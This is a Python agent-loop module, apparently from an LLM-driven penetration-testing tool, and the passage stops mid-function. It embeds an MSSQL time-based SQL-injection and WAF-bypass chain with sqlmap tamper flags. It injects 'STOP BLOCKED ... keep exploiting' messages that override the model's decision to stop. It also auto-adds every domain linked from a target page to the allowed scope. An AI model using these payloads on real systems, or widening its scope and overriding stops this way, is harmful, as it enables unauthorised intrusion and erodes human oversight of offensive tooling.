"""Agent Loop — Claude Code CLI style execution loop.

Model → tool_use → executor runs → results fed back → repeat.
No legacy code block parsing. No heuristic drift detection.
Structure prevents hallucination and drift by design.
"""
from __future__ import annotations

import collections
import hashlib
import json as _json
import threading
from typing import Iterator, Optional

from rich.console import Console

from ..models.base import StreamChunk
from ..models.base import ToolCall as ModelToolCall
from ..models.registry import ModelRegistry
from ..tools.function_schema import BINGO_TOOLS
from ..tools.findings_exporter import FindingsExporter, Finding
from ..config import BingoConfig
from .context import ContextManager, Message
from .executor import ToolExecutor, ToolCall, ToolResult
from .system_prompt import build_system_prompt
from .reporter import generate_report, generate_html_report, save_report, save_html_report


class AgentLoop:
    """Claude Code CLI architecture agent loop for penetration testing."""

    def __init__(self, target: str, config: BingoConfig, console: Console | None = None, event_bus=None):
        self.target = target
        self.config = config
        self.console = console or Console()
        self.lang = config.lang or "en"
        self._event_bus = event_bus  # Web UI bridge (optional)

        model_cfg = config.get_active_model_config()
        if not model_cfg:
            raise RuntimeError("No model configured. Run /model first.")

        self._model = ModelRegistry.build(model_cfg)
        self._provider = getattr(model_cfg, "provider", "deepseek")
        self._is_claude = self._provider == "claude"

        vpn_mode = self._detect_vpn()
        self.executor = ToolExecutor(target, vpn_mode=vpn_mode)
        self.findings = FindingsExporter(target=target)

        # Task Graph — 침투 단계 DAG
        from ..core.intelligence import TaskGraph
        self.task_graph = TaskGraph()
        self.task_graph.load_template(target)

        # Knowledge Base — 자동 로딩
        self._kb_context = self._load_kb(target)

        # Skills Engine — 키워드 매칭 스킬 검색
        self._skill_context = self._load_skills(target)

        system_prompt = build_system_prompt(target, self.lang, self._provider)
        system_prompt += self._build_context_injection()
        self.context = ContextManager(system_prompt)

        self._max_loops = self._estimate_loop_budget(target)
        self._loop_count = 0

        # Zero Hallucination Engine — model text claim validation
        from ..core.zero_hal_v5 import ZeroHalEngine
        self.zero_hal = ZeroHalEngine(session_target=target, lang=self.lang)
        # Rolling window of recent exec outputs fed into the HAL gate (up to 20 × 2 KB)
        self._recent_exec_outputs: list[str] = []
        # Pending user-turn injections: HAL corrections + depth nudges, drained before each _call_model()
        self._pending_injections: list[str] = []
        # Track dynamic skill injection sigs (one-shot, avoid duplicate)
        self._nudged_finding_ids: set[str] = set()
        # Persistent focus tracking — finding_id → last loop nudged / total nudge count
        self._finding_last_nudge: dict[str, int] = {}
        self._finding_nudge_count: dict[str, int] = {}
        # Dynamic loop budget — last loop where a new finding was promoted (any confidence)
        self._last_finding_loop: int = 0
        # Number of dynamic budget extensions applied this session (cap: 2)
        self._budget_extensions: int = 0

    def run(self, user_message: str) -> None:
        """Execute the full agent loop for a user message."""
        self.context.append_user(user_message)
        nudge_count = 0

        while True:
            self._loop_count += 1

            # Drain web UI hints into pending injections
            if self._event_bus:
                for _hint in self._event_bus.drain_hints():
                    self._pending_injections.append(f"[Web UI Hint] {_hint}")
                self._event_bus.push_event("loop_start", {"loop": self._loop_count, "target": self.target})

            # Periodic focus re-injection — every 5 loops, re-assert unresolved findings
            if self._loop_count % 5 == 0:
                self._maybe_reinject_focus()

            # Drain pending injections (HAL corrections + depth nudges) before calling model
            while self._pending_injections:
                self.context.append_user(self._pending_injections.pop(0))

            # 1. Call model
            response_text, tool_calls = self._call_model()

            # 2. If tool calls → execute and continue
            if tool_calls:
                nudge_count = 0
                tc_payload = [
                    {
                        "id": tc.id,
                        "type": "function",
                        "function": {"name": tc.name, "arguments": _json.dumps(tc.arguments, ensure_ascii=False)},
                    }
                    for tc in tool_calls
                ]
                self.context.append_assistant(response_text or "", tool_calls=tc_payload)
                results = self.executor.run_tools([
                    ToolCall(id=tc.id, name=tc.name, arguments=tc.arguments)
                    for tc in tool_calls
                ])
                for r in results:
                    self.context.append_tool_result(r.tool_call_id, r.name, r.content)
                    # Register exec facts in ZeroHalEngine so later claims can be anchored
                    if not r.error and r.output:
                        self.zero_hal.register_exec(r.output)
                        self._recent_exec_outputs.append(r.output[:2000])
                        if len(self._recent_exec_outputs) > 20:
                            self._recent_exec_outputs.pop(0)
                    # Dynamic skill injection — detect auth protocols in tool output
                    if not r.error and r.output:
                        self._maybe_inject_dynamic_skill(r.output)
                    new_finding = self._process_evidence(r)
                    # Emit finding event to web UI
                    if new_finding is not None and self._event_bus:
                        self._event_bus.push_event("finding", {
                            "id": new_finding.id,
                            "vuln_type": new_finding.vuln_type,
                            "severity": getattr(new_finding, "severity", ""),
                            "target": new_finding.target,
                            "payload": getattr(new_finding, "payload", "") or "",
                            "evidence": (new_finding.evidence or "")[:800],
                            "confidence": new_finding.confidence,
                        })
                    # Depth nudge: when a probable/confirmed finding appears, queue a
                    # focused follow-up message so the model drills down instead of drifting
                    if new_finding is not None and new_finding.confidence in ("probable", "confirmed"):
                        self._queue_depth_nudge(new_finding)
                    # Track last loop where any new finding was promoted (for dynamic budget)
                    if new_finding is not None:
                        self._last_finding_loop = self._loop_count
                    self._extract_related_domains(r)
                    self._display_tool_result(r)
                # HAL gate: validate model text claims against accumulated exec evidence.
                # Runs after tools execute so the gate has the freshest facts.
                if response_text:
                    _combined_exec = "\n".join(self._recent_exec_outputs[-5:])
                    _hal = self.zero_hal.process(response_text, _combined_exec)
                    if _hal.blocked:
                        self.console.print(
                            f"\n[#ff6d00]⚡ ZeroHal [{_hal.block_reason}] — unanchored claim corrected[/]"
                        )
                        if self._event_bus:
                            self._event_bus.push_event("hal_event", {"reason": _hal.block_reason, "blocked": True, "loop": self._loop_count})
                        self._pending_injections.insert(0, _hal.inject_message)
                    elif _hal.warned and _hal.inject_message:
                        if self._event_bus:
                            self._event_bus.push_event("hal_event", {"reason": "warned", "blocked": False, "loop": self._loop_count})
                        self._pending_injections.append(_hal.inject_message)
                    # Model-text SQLi auto-promote: if model claims a SQLi signal
                    # in its analysis text but never called add_finding, create the
                    # finding now so focus-persistence fires on next loop.
                    _text_finding = self._auto_sqli_from_model_text(response_text)
                    if _text_finding is not None and _text_finding.confidence in ("probable", "confirmed"):
                        self._queue_depth_nudge(_text_finding)
                        if self._event_bus:
                            self._event_bus.push_event("finding", {
                                "id": _text_finding.id,
                                "vuln_type": _text_finding.vuln_type,
                                "severity": getattr(_text_finding, "severity", ""),
                                "target": _text_finding.target,
                                "confidence": _text_finding.confidence,
                            })
                # Hard cap check — with dynamic extension
                if self._max_loops and self._loop_count >= self._max_loops:
                    # Dynamic extension: if a new finding appeared in the last 15 loops,
                    # extend the budget by 20 to allow drill-down. Cap: 2 extensions (+40 max).
                    _loops_since_finding = self._loop_count - self._last_finding_loop
                    if (self._last_finding_loop > 0
                            and _loops_since_finding <= 15
                            and self._budget_extensions < 2):
                        self._budget_extensions += 1
                        self._max_loops += 20
                        self.console.print(
                            f"\n[#ffd600]⚡ Active signal {_loops_since_finding} loops ago — "
                            f"extending budget to {self._max_loops} "
                            f"(ext {self._budget_extensions}/2)[/]"
                        )
                        self._maybe_compact()
                        continue
                    self.console.print(
                        f"\n[#ffd600]⚡ Loop cap reached ({self._max_loops}) — generating report.[/]"
                    )
                    self._finalize()
                    return
                self._maybe_compact()
                continue

            # 3. Text only — model chose not to call any tool.
            # Before finalizing, check for unresolved high-priority findings.
            # If probable/confirmed findings remain unresolved, force model to continue.
            self.context.append_assistant(response_text)
            if response_text:
                _combined_exec = "\n".join(self._recent_exec_outputs[-5:])
                _hal = self.zero_hal.process(response_text, _combined_exec)
                if _hal.blocked:
                    self.console.print(
                        f"\n[#ff6d00]⚡ ZeroHal [{_hal.block_reason}] — correcting text-only claim[/]"
                    )
                    if self._event_bus:
                        self._event_bus.push_event("hal_event", {"reason": _hal.block_reason, "blocked": True, "loop": self._loop_count})
                    self.context.append_user(_hal.inject_message)
                    continue  # HAL correction: retry once, still model-driven
                elif _hal.warned and _hal.inject_message:
                    if self._event_bus:
                        self._event_bus.push_event("hal_event", {"reason": "warned", "blocked": False, "loop": self._loop_count})
                    self._pending_injections.append(_hal.inject_message)
            # Guard: don't finalize if probable/confirmed findings are still unresolved
            _unresolved = self._get_high_priority_unresolved()
            if _unresolved and self._loop_count < self._max_loops:
                self._inject_no_stop_mandate(_unresolved)
                continue
            # Model produced text without any tool call → self-decided to stop.
            self._finalize()
            return

    def _call_model(self) -> tuple[str, list[ModelToolCall]]:
        """Call model and stream response. Returns (text, tool_calls)."""
        messages = self.context.build_messages()
        tools = self._get_tools_for_provider()

        text_parts: list[str] = []
        tool_calls: list[ModelToolCall] = []

        self.console.print(f"\n[#00ff41]╔═[BINGO]══ {self._loop_count} ══▶[/]\n")
        stream = self._model.chat_stream(messages, tools=tools)
        for chunk in stream:
            if chunk.text:
                text_parts.append(chunk.text)
                self.console.print(chunk.text, end="", highlight=False, markup=False)
                if self._event_bus:
                    self._event_bus.push_event("stream_chunk", {"text": chunk.text, "loop": self._loop_count})
            if chunk.tool_calls:
                tool_calls = chunk.tool_calls
            if chunk.failure:
                self.console.print(f"\n[#ff1744]✗ Provider error: {chunk.failure.message}[/]")
                break

        full_text = "".join(text_parts)
        if full_text:
            self.console.print()
        return full_text, tool_calls

    def _get_tools_for_provider(self) -> list[dict] | None:
        # Always return raw BINGO_TOOLS — each model class (_build_payload /
        # _build_claude_payload) handles the format conversion internally.
        # Pre-converting here caused a double-convert on Claude: loop.py →
        # to_anthropic_format → base.py → to_anthropic_format again → KeyError.
        return BINGO_TOOLS

    @staticmethod
    def _make_tool_sig(tc) -> str:
        """Tool call signature for duplicate detection."""
        args_str = _json.dumps(tc.arguments, sort_keys=True, ensure_ascii=False, default=str)[:200]
        return hashlib.md5(f"{tc.name}:{args_str}".encode()).hexdigest()[:8]

    def _process_evidence(self, result: ToolResult) -> Optional["Finding"]:
        """Feed tool output through the evidence ladder. Returns new Finding if promoted."""
        if result.error:
            return None
        import json as _json
        code_snippet = (
            _json.dumps(result.arguments, ensure_ascii=False, default=str)[:500]
            if result.arguments
            else result.name
        )
        finding = self.findings.process(
            result.output,
            code_snippet=code_snippet,
            execution_context={"tool_name": result.name, "executed": True},
        )
        if finding is not None:
            return finding
        # Secondary pass: executor-level SQL error auto-detect.
        # Evidence ladder misses raw SQL errors that appear in HTTP response bodies
        # when the model probes manually (no TRUE/FALSE size-diff format).
        sql_finding = self._auto_sqli_from_output(result)
        if sql_finding is not None:
            return sql_finding
        # Tertiary pass: WAF bypass signal — time-based SQLi payload that received
        # a non-403 response, indicating the payload reached the application layer.
        return self._auto_waf_bypass_signal(result)

    # ── SQL error regex (定义为类常量, 避免每次编译) ──────────────────────────
    _SQL_ERROR_RE = None  # lazy init

    @classmethod
    def _get_sql_error_re(cls):
        import re as _re
        if cls._SQL_ERROR_RE is None:
            cls._SQL_ERROR_RE = _re.compile(
                r"Microsoft OLE DB Provider for SQL"
                r"|Unclosed quotation mark after the character string"
                r"|Incorrect syntax near ['\"]"
                r"|You have an error in your SQL syntax"
                r"|ORA-\d{4,5}:"
                r"|PG::SyntaxError"
                r"|pg_query\(\).*?failed"
                r"|Warning:\s+mysql_"
                r"|supplied argument is not a valid MySQL"
                r"|SQLSTATE\["
                r"|DB function failed with error number"
                r"|Syntax error or access violation"
                r"|Division by zero in.*?SQL"
                r"|quoted string not properly terminated"
                r"|unterminated quoted string at or near",
                _re.I,
            )
        return cls._SQL_ERROR_RE

    def _auto_sqli_from_output(self, result: ToolResult) -> Optional["Finding"]:
        """Executor-level SQLi signal detector.

        Catches raw SQL error messages that the evidence ladder misses because
        the model formatted the probe output without TRUE/FALSE size markers.
        Returns a probable Finding if a definitive SQL error is detected.
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        output = result.output
        if not self._get_sql_error_re().search(output):
            return None
        # Extract URL/endpoint from code_snippet or output for scope_key
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', output)
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli:{target_url[:120]}"
        # Dedup: don't create duplicate findings for same endpoint
        for existing in self.findings._findings:
            if existing.vuln_type == FINDING_SQLI and existing.scope_key == scope_key:
                return None
        finding_id = "auto_sqli_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload=result.name,
            evidence=output[:2000],
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="sql_error_in_response",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _auto_waf_bypass_signal(self, result: ToolResult) -> Optional["Finding"]:
        """Detect WAF bypass: time-based SQLi payload that received a non-403 response.

        When BoraWare/Akamai/CF blocks boolean SQLi (403) but passes time-based keywords
        (SLEEP/WAITFOR), the tool output shows a small 200 response (e.g. wrong-credentials
        alert) instead of a 403 WAF block. This is a high-value signal that a time-based
        SQLi channel is open.

        Pattern:
          - Output contains SLEEP/WAITFOR/BENCHMARK SQLi keyword
          - Response size is NOT ~199 (WAF block size) AND > 60 bytes
          - OR HTTP 200 without 403
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        output = result.output

        # Must contain time-based SQLi keywords in the executed payload
        _TIME_SQLI_RE = _re.compile(
            r"SLEEP\s*\(\s*\d+\s*\)"
            r"|WAITFOR\s+DELAY"
            r"|BENCHMARK\s*\(\s*\d+"
            r"|pg_sleep\s*\(\s*\d+"
            r"|AND\s+SLEEP\s*\("
            r"|IF\s*\(.*WAITFOR"
            r"|CASE\s+WHEN.*WAITFOR"
            r"|;\s*IF\s*\(.*DELAY",
            _re.I,
        )
        if not _TIME_SQLI_RE.search(output):
            return None

        # WAF block signature: size ~199, HTTP 403
        # Bypass signature: size != 199 AND > 60, OR 200 without 403
        _bypass_detected = False

        sizes = [int(m) for m in _re.findall(r'(?i)(?:size|SIZE)[:\s=]+(\d+)', output)]
        for sz in sizes:
            # WAF block is typically 199 bytes; application responses are different sizes
            if 60 < sz < 180 or sz > 200:
                _bypass_detected = True
                break

        if not _bypass_detected:
            has_200 = bool(_re.search(r'HTTP[/\s]+1\.[01]\s+200|status[:\s]+200', output, _re.I))
            has_403 = bool(_re.search(r'HTTP[/\s]+1\.[01]\s+403|status[:\s]+403', output, _re.I))
            if has_200 and not has_403:
                _bypass_detected = True

        if not _bypass_detected:
            return None

        # Extract endpoint URL
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', output)
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli_waf_bypass:{target_url[:120]}"

        # Dedup — one bypass finding per endpoint
        for existing in self.findings._findings:
            if existing.scope_key == scope_key:
                return None

        # Extract matched payload snippet for evidence
        _m = _TIME_SQLI_RE.search(output)
        payload_snip = output[max(0, _m.start() - 30): _m.end() + 80].strip() if _m else ""

        finding_id = "waf_bypass_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload=payload_snip[:200],
            evidence=(
                f"[WAF bypass signal] Time-based SQLi payload bypassed WAF "
                f"(non-403 response detected):\n{output[:1500]}"
            ),
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="time_based_waf_bypass",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _auto_sqli_from_model_text(self, response_text: str) -> Optional["Finding"]:
        """Promote SQLi finding when the model explicitly claims a SQLi signal in text.

        Triggered when model text contains phrases like "单引号通过了", "size differential",
        "time delay", etc., AND recent tool outputs include a non-trivial HTTP 200 response.
        This bridges the gap where the model recognizes a SQLi indicator in its analysis
        but never calls add_finding, causing the finding focus mechanism to never fire.
        """
        if not response_text:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        # Phrases the model uses when it detects a SQLi signal
        _SQLI_CLAIM_RE = _re.compile(
            r"单引号通过|引号通过了|quote.*pass|pass.*quote"
            r"|size differential.*\d{2,}[Bb]"
            r"|time.{0,15}delay.{0,30}confirm|delay confirm"
            r"|注入点.*发现|发现.*注入点|sqli.*found|found.*sqli"
            r"|SQLi.*detected|detected.*SQLi"
            r"|통과했|단일 따옴표.*통과|크기 차이.*바이트"
            r"|injec.*pass|pass.*injec",
            _re.I,
        )
        if not _SQLI_CLAIM_RE.search(response_text):
            return None
        # Confirm there's recent tool output with HTTP 200 content (not a WAF block)
        _has_real_response = False
        for out in self._recent_exec_outputs[-3:]:
            if _re.search(r'(?:Status|HTTP)[:/\s]+200', out, _re.I) and len(out) > 500:
                _has_real_response = True
                break
        if not _has_real_response:
            return None
        # Extract endpoint from model text or recent output
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', response_text)
        if not _url_m:
            for out in reversed(self._recent_exec_outputs[-3:]):
                _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', out)
                if _url_m:
                    break
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli:{target_url[:120]}"
        # Dedup
        for existing in self.findings._findings:
            if existing.vuln_type == FINDING_SQLI and existing.scope_key == scope_key:
                return None
        finding_id = "model_sqli_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        # Extract the matched claim snippet for evidence
        _claim_m = _SQLI_CLAIM_RE.search(response_text)
        claim_snip = response_text[max(0, _claim_m.start()-80): _claim_m.end()+120] if _claim_m else ""
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload="model_text_claim",
            evidence=f"[model claim] {claim_snip[:500]}",
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="model_text_sqli_claim",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _extract_related_domains(self, result: ToolResult) -> None:
        """타겟 HTML/응답에서 참조된 도메인을 허용 목록에 추가."""
        if result.error or not result.output:
            return
        import re as _re
        for domain in _re.findall(r'(?:src|href)=["\']https?://([a-zA-Z0-9][-a-zA-Z0-9.]*\.[a-zA-Z]{2,})', result.output):
            self.executor.allow_domain(domain)

    def _display_tool_result(self, result: ToolResult) -> None:
        """Show tool execution status to user."""
        from rich.text import Text
        if result.error:
            self.console.print(Text(f"  ✗ {result.name}: {result.error[:120]}", style="#ff1744"))
            if self._event_bus:
                self._event_bus.push_event("tool_result", {
                    "name": result.name, "error": result.error[:120],
                    "preview": result.error[:100], "loop": self._loop_count,
                })
        else:
            preview = result.output[:100].replace("\n", " ")
            self.console.print(Text(f"  ✓ {result.name}: {preview}...", style="#546e7a"))
            if self._event_bus:
                self._event_bus.push_event("tool_result", {
                    "name": result.name, "error": None,
                    "preview": preview, "loop": self._loop_count,
                })

    def _maybe_compact(self) -> None:
        """Trigger background compaction if needed."""
        if not self.context.needs_compaction():
            return
        msgs_to_compact = self.context.mark_compacting()
        if not msgs_to_compact:
            return
        thread = threading.Thread(
            target=self._compact_background, args=(msgs_to_compact,), daemon=True
        )
        thread.start()

    def _compact_background(self, messages: list[Message]) -> None:
        """Background thread: summarize tool results — always pin active findings so they survive compaction."""
        # ── 1. Pin confirmed/probable findings at the top — never lose these ──
        pinned_lines: list[str] = []
        for f in self.findings._findings:
            if f.confidence in ("confirmed", "probable"):
                ev = (f.evidence or "")[:300].replace("\n", " ")
                pinned_lines.append(
                    f"[ACTIVE-FINDING id={f.id} type={f.vuln_type} conf={f.confidence}] "
                    f"target={f.target} | evidence: {ev}"
                )

        # ── 2. Collect tool facts (600-char limit, up to 50 entries) ──────────
        tool_facts = [
            f"[{m.name or 'tool'}] {m.content[:600]}"
            for m in messages if m.role == "tool"
        ]
        if not tool_facts and not pinned_lines:
            self.context.set_compaction_summary(
                "[No tool results in this segment — nothing confirmed by execution]"
            )
            return

        # ── 3. Build prompt with pinned findings header ───────────────────────
        pinned_block = ""
        if pinned_lines:
            pinned_block = (
                "## ACTIVE FINDINGS — MUST BE PRESERVED VERBATIM IN SUMMARY:\n"
                + "\n".join(pinned_lines)
                + "\n\n"
            )

        prompt = (
            pinned_block
            + "Summarize ONLY these actual tool execution results as bullet facts. "
            "Do NOT include any model analysis or unconfirmed claims. "
            "The ACTIVE FINDINGS above must appear at the top of your summary unchanged. "
            "Each bullet = one confirmed tool observation:\n\n"
            + "\n".join(f"- {f}" for f in tool_facts[:50])
        )
        try:
            summary_parts = []
            for chunk in self._model.chat_stream([
                {"role": "user", "content": prompt}
            ]):
                if chunk.text:
                    summary_parts.append(chunk.text)
            raw_summary = "".join(summary_parts)
            # Guarantee pinned findings survive even if the model drops them
            if pinned_lines and not any(f"id={f.id}" in raw_summary for f in self.findings._findings if f.confidence in ("confirmed", "probable")):
                raw_summary = "\n".join(pinned_lines) + "\n\n" + raw_summary
            self.context.set_compaction_summary(raw_summary)
        except Exception:
            # Fallback: at minimum preserve pinned findings
            fallback = "[Compaction failed — continuing with recent context]"
            if pinned_lines:
                fallback = "\n".join(pinned_lines) + "\n\n" + fallback
            self.context.set_compaction_summary(fallback)

    def _finalize(self) -> None:
        """Generate and save the report (MD + HTML)."""
        report = generate_report(self.target, self.findings, self.lang)
        html_report = generate_html_report(self.target, self.findings, self.lang)
        md_path = save_report(self.target, report)
        html_path = save_html_report(self.target, html_report)
        confirmed = len([f for f in self.findings._findings if f.confirmed])
        probable = len([f for f in self.findings._findings if not f.confirmed and f.confidence == "probable"])
        potential = len([f for f in self.findings._findings if not f.confirmed and f.confidence == "potential"])
        self.console.print(f"\n[#00ff41]{'━' * 60}[/]")
        self.console.print(f"  [#ce93d8]📄 MD Report:[/]   [#00e5ff]{md_path}[/]")
        self.console.print(f"  [#ce93d8]🌐 HTML Report:[/] [#00e5ff]{html_path}[/]")
        self.console.print(f"  [#00ff41]Confirmed:[/] {confirmed}  [#ffd600]Probable:[/] {probable}  [#546e7a]Potential:[/] {potential}")
        self.console.print(f"[#00ff41]{'━' * 60}[/]")
        if self._event_bus:
            self._event_bus.push_event("session_done", {
                "confirmed": confirmed, "probable": probable,
                "potential": potential, "report_path": str(md_path),
            })

    def _queue_depth_nudge(self, finding) -> None:
        """Queue a depth-focus injection for a newly promoted probable/confirmed finding.

        Re-injectable every 5 loops (up to 15 times total) so the model cannot drift
        indefinitely after discovering a high-value candidate.
        """
        from ..tools.findings_exporter import CONF_CONFIRMED, CONF_PROBABLE
        if finding.confidence not in (CONF_CONFIRMED, CONF_PROBABLE):
            return
        last_loop = self._finding_last_nudge.get(finding.id, -99)
        total = self._finding_nudge_count.get(finding.id, 0)
        # Cooldown: don't re-nudge within 3 loops; hard cap: 15 nudges per finding
        if (self._loop_count - last_loop) < 3 or total >= 15:
            return
        self._finding_last_nudge[finding.id] = self._loop_count
        self._finding_nudge_count[finding.id] = total + 1
        self._build_and_queue_nudge(finding)

    def _build_and_queue_nudge(self, finding) -> None:
        """Build the depth-focus injection message and push it to pending_injections."""
        from ..tools.findings_exporter import CONF_CONFIRMED
        _TOOL_HINTS: dict[str, str] = {
            "sqli": (
                "sqli_autoexploit — WAF BYPASS CHAIN (execute in order, do NOT skip):\n"
                "1. httpx HTTP/2 session (bypass Akamai/CF TLS fingerprint): "
                "client=httpx.Client(http2=True, headers=BROWSER_HEADERS)\n"
                "2. MSSQL time-based blind — NO AND/OR needed (highest WAF bypass rate):\n"
                "   '; WAITFOR DELAY '0:0:5'--   |   '; IF(1=1) WAITFOR DELAY '0:0:5'--\n"
                "   Binary: IF(UNICODE(LEFT(db_name(),1))>64) WAITFOR DELAY '0:0:3'--\n"
                "3. SUBSTRING blocked → LEFT()/UNICODE(LEFT()) for char-by-char extraction\n"
                "4. sqlmap: --technique=T --time-sec=5 --timeout=60 "
                "--tamper=charencode,randomcase,space2comment --random-agent --delay=5\n"
                "⛔ Boolean keyword WAF block ≠ not injectable. Time-based is a SEPARATE bypass path."
            ),
            "xss": "xss_autotest — require browser JS execution; reflection alone is NOT proof",
            "ssrf": "ssrf_check — require internal-service response absent from baseline",
            "lfi": "lfi_check — require exact file content (e.g. /etc/passwd lines)",
            "rce": "bash_exec — require uid/gid output or unique command canary",
            "auth_bypass": "http_request — compare authenticated vs unauthenticated access to same resource",
            "credential": "manual verify — extracted secret must authenticate against a real login endpoint",
            "info_disclosure": "http_request — confirm sensitive data is absent from the normal baseline",
        }
        tier = "CONFIRMED✓" if finding.confidence == CONF_CONFIRMED else "PROBABLE"
        hint = _TOOL_HINTS.get(finding.vuln_type, "http_request with negative control comparison")
        evidence_snip = (finding.evidence or "")[:200].replace("\n", " ")
        if self.lang == "ko":
            msg = (
                f"[⚡ DEPTH FOCUS — {finding.id} {finding.vuln_type.upper()} {tier}]\n"
                f"증거: {evidence_snip}\n\n"
                f"즉시 실행하세요: {hint}\n"
                f"⛔ 다른 테스트벡터로 이동 금지 — 이 발견을 먼저 검증/심화공략하세요."
            )
        elif self.lang == "zh":
            msg = (
                f"[⚡ DEPTH FOCUS — {finding.id} {finding.vuln_type.upper()} {tier}]\n"
                f"증거: {evidence_snip}\n\n"
                f"立即执行: {hint}\n"
                f"⛔ 禁止切换测试向量 — 先验证/深入利用此发现。"
            )
        else:
            msg = (
                f"[⚡ DEPTH FOCUS — {finding.id} {finding.vuln_type.upper()} {tier}]\n"
                f"Evidence: {evidence_snip}\n\n"
                f"Execute now: {hint}\n"
                f"⛔ Do NOT switch to other test vectors — verify/exploit this finding first."
            )
        self._pending_injections.append(msg)
        if self._event_bus:
            self._event_bus.push_event("depth_nudge", {
                "finding_id": finding.id, "vuln_type": finding.vuln_type,
                "loop": self._loop_count,
            })

    def _maybe_reinject_focus(self) -> None:
        """Every 5 loops, re-nudge any probable/confirmed findings that haven't been resolved."""
        if self._loop_count % 5 != 0:
            return
        unresolved = self._get_high_priority_unresolved()
        for finding in unresolved:
            self._queue_depth_nudge(finding)

    def _get_high_priority_unresolved(self) -> list:
        """Return probable/confirmed findings that are not yet confirmed (still need exploitation)."""
        from ..tools.findings_exporter import CONF_CONFIRMED, CONF_PROBABLE
        try:
            findings = list(self.findings._findings)
        except Exception:
            return []
        result = []
        for f in findings:
            if getattr(f, "confidence", None) in (CONF_CONFIRMED, CONF_PROBABLE):
                result.append(f)
        return result

    def _inject_no_stop_mandate(self, unresolved: list) -> None:
        """Inject a hard mandate message preventing the model from stopping while unresolved findings exist."""
        ids = ", ".join(f.id for f in unresolved[:5])
        types = ", ".join(dict.fromkeys(f.vuln_type for f in unresolved[:5]))
        if self.lang == "ko":
            msg = (
                f"[🚫 STOP BLOCKED — 미해결 발견 {len(unresolved)}개 존재]\n"
                f"ID: {ids}  |  유형: {types}\n\n"
                f"아직 종료할 수 없습니다. 위 발견을 confirmed로 만들거나 완전히 기각하기 전까지 계속 공략하세요.\n"
                f"지금 당장: 각 발견에 대해 exploit 도구를 실행하세요."
            )
        elif self.lang == "zh":
            msg = (
                f"[🚫 STOP BLOCKED — 存在 {len(unresolved)} 个未解决发现]\n"
                f"ID: {ids}  |  类型: {types}\n\n"
                f"尚不能结束。在confirmed或完全排除上述发现之前，继续攻击。\n"
                f"立即执行: 对每个发现运行exploit工具。"
            )
        else:
            msg = (
                f"[🚫 STOP BLOCKED — {len(unresolved)} unresolved finding(s) exist]\n"
                f"ID: {ids}  |  Type: {types}\n\n"
                f"You CANNOT stop yet. Keep exploiting until each finding is confirmed or fully ruled out.\n"
                f"Right now: run exploit tools against each finding above."
            )
        self._pending_injections.append(msg)

    @staticmethod
    def _detect_vpn() -> bool:
        """Check if VPN DNS spoofing is active (198.18.x.x)."""
        import subprocess
        try:
            proc = subprocess.run(
                ["scutil", "--dns"], capture_output=True, text=True, timeout=5,
            )
            return "198.18." in proc.stdout
        except Exception:
            return False

    def _load_kb(self, target: str) -> str:
        """Load relevant knowledge base entries for target."""
        try:
            from ..knowledge.loader import KBLoader
            kb = KBLoader()
            return kb.inject_for(target, max_chars=2000)
        except Exception:
            return ""

    @staticmethod
    def _keywords_from_target(target: str) -> str:
        """Extract searchable keywords from a target URL/host.

        Splits URL components into tokens so skill routes that match on
        words like 'cognito', 'aws', 'api', 'login' can fire even when
        the raw URL string doesn't contain those words verbatim.

        Examples:
            https://app.example.com          → 'app example'
            https://cognito.auth.us-east-1.amazoncognito.com
                                             → 'cognito auth us east amazoncognito aws'
            https://api.example.com/v1/login → 'api example v1 login'
        """
        from urllib.parse import urlparse
        import re

        parsed = urlparse(target if "://" in target else f"https://{target}")
        host = parsed.hostname or ""
        path = parsed.path or ""

        # Remove TLD noise, split on dots/hyphens/underscores/slashes
        raw = f"{host} {path}"
        tokens = re.split(r"[.\-_/]", raw.lower())
        tokens = [t for t in tokens if len(t) > 2 and t not in ("com", "net", "org", "www", "https", "http")]

        # Add synthetic aliases for well-known patterns
        extras: list[str] = []
        if any("cognito" in t for t in tokens):
            extras += ["cognito", "srp", "aws cognito", "USER_SRP_AUTH", "aws auth"]
        if any(t in ("amazonaws", "amazoncognito", "aws") for t in tokens):
            extras += ["aws", "cloud"]
        if any(t in ("login", "auth", "oauth", "oidc", "sso") for t in tokens):
            extras += ["auth bypass", "login bypass"]
        if any(t in ("api",) for t in tokens):
            extras += ["api fuzz"]
        if any(t in ("graphql",) for t in tokens):
            extras += ["graphql"]

        return " ".join(tokens + extras)

    def _load_skills(self, target: str) -> str:
        """Load relevant skills for target — internal DB + local skill routes."""
        try:
            from ..skills.engine import SkillEngine
            se = SkillEngine()
            parts: list[str] = []

            keyword = self._keywords_from_target(target)

            # 내장 DB 검색
            results = se.search(keyword)
